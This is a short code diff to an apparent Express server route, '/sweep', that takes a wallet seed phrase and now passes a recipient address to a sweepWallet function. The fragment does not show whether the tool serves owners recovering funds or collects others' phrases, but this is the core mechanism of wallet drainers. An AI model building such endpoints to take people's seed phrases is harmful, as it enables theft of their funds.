@@ -56,7 +56,7 @@ app.post('/sweep', async (req, res) => {
     }
 
     try {
-        const sweeper = await sweepWallet(phrase);
+        const sweeper = await sweepWallet(phrase, recipient);
         res.json({ success: true, sweeper });
     } catch(err) {
         res.status(500).json({ error: err.response?.data || err.message });
